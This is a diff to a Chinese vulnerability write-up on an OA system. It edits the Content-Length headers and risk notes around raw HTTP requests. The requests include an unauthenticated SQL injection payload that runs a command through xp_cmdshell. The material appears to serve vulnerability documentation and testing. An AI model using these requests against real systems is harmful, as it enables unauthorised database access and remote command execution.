@@ -41,7 +41,7 @@ schema_version: "1"
 
 ## 操作风险
 
-现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -64,6 +64,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 Referer: http://192.168.202.1/
 Connection: close
 Host: 192.168.202.1
+Content-Length: 391
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US
 Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
@@ -83,7 +84,7 @@ Content-Disposition: form-data;
 ------------GFioQpMK0vv2--
 ```
 
-> 请求长度说明：原资料 Content-Length 为 391；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 391；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ```http
 POST /general/file_folder/api.php HTTP/1.1
@@ -95,6 +96,7 @@ Connection: close
 Host: 192.168.202.1
 Pragma: no-cache
 x-requested-with: XMLHttpRequest
+Content-Length: 82
 x-wvs-id: Acunetix-Deepscan/209
 Cache-Control: no-cache
 accept: */*
@@ -105,7 +107,7 @@ content-type: application/x-www-form-urlencoded; charset=UTF-8
 CONTENT_ID_STR=222&SORT_ID=59&FILE_SORT=1&action=sign
 ```
 
-> 请求长度说明：原资料 Content-Length 为 82；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 82；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 看看下图，在我去掉 cookie 之后，发现一样能注入，我测试的 11.5 版本存在未授权也能注入。  
 
@@ -134,6 +136,7 @@ Connection: close
 Host: 192.168.202.1
 Pragma: no-cache
 x-requested-with: XMLHttpRequest
+Content-Length: 97
 x-wvs-id: Acunetix-Deepscan/186
 Cache-Control: no-cache
 accept: */*
@@ -144,7 +147,7 @@ content-type: application/x-www-form-urlencoded; charset=UTF-8
 m_id=5&join_flag=2&remark='%3b%20exec%20master%2e%2exp_cmdshell%20'ping%20172%2e10%2e1%2e255'--
 ```
 
-> 请求长度说明：原资料 Content-Length 为 97；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 97；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqcNGbibLvLMAyLEUTCdsTPhswH64n58RtCdDIc0zIhyQbuvk5aiaUcM7714yqkzh5y9sgkfg8yJvbnw/640?wx_fmt=png)
 
